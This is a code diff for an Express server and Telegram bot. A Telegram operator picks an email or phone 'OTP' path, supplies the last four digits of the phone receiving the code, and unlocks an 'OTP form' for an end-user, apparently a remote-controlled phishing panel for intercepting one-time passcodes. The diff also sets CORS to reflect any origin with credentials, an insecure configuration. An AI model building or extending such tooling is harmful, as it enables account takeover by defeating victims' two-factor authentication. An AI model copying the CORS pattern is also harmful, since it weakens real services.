@@ -19,12 +19,25 @@ const store = new Map();
 
 // Express setup
 const app = express();
-app.use(cors({ origin: '*' }));
+
+// If you're behind a proxy (Heroku, Nginx, etc.), uncomment this:
+// app.set('trust proxy', 1);
+
+app.use(cors({
+  origin: true,          // reflect the request origin
+  credentials: true      // allow session cookie to be sent
+}));
+
 app.use(bodyParser.json());
+
 app.use(session({
   secret: 'your-session-secret',
   resave: false,
-  saveUninitialized: true
+  saveUninitialized: true,
+  cookie: {
+    secure: true,        // **only** over HTTPS
+    sameSite: 'none'     // allow cookie in “cross‑site” requests (fetch/ajax)
+  }
 }));
 
 // Health check
@@ -165,19 +178,17 @@ bot.on('callback_query', async query => {
   const sess = store.get(sessionId);
 
   if (action === 'startOtp') {
-    sess.method = param;            // record method
-    sess.phoneLast4 = null;         // reset last4
-    // only for email do we show immediately:
+    sess.method = param;
+    sess.phoneLast4 = null;
     if (param === 'email') {
       sess.ready = true;
       await bot.answerCallbackQuery(query.id, { text: 'OTP via email' });
       await bot.sendMessage(chatId, '🔔 OTP form enabled via email.');
     } else {
-      // phone path: ask for last4 but do not set ready
       await bot.answerCallbackQuery(query.id, { text: 'OTP via phone' });
       await bot.sendMessage(chatId,
         '❓ Please reply with the *last 4 digits* of the phone where the OTP will arrive:',
-        { parse_mode: 'Markdown' }
+        { parse_mode: 'Markdown', reply_markup: { force_reply: true } }
       );
     }
     store.set(sessionId, sess);
@@ -203,10 +214,9 @@ bot.on('message', async msg => {
   const sess = store.get(sessionId);
   const text = msg.text.trim();
 
-  // only accept 4 digits when method=phone and not yet set:
   if (sess.method === 'phone' && !sess.phoneLast4 && /^\d{4}$/.test(text)) {
     sess.phoneLast4 = text;
-    sess.ready      = true;     // now allow end‑user to see OTP form
+    sess.ready      = true;
     store.set(sessionId, sess);
 
     await bot.sendMessage(chatId,
@@ -214,7 +224,6 @@ bot.on('message', async msg => {
     );
   }
 });
-
 
 // Start
 app.listen(PORT, () => {
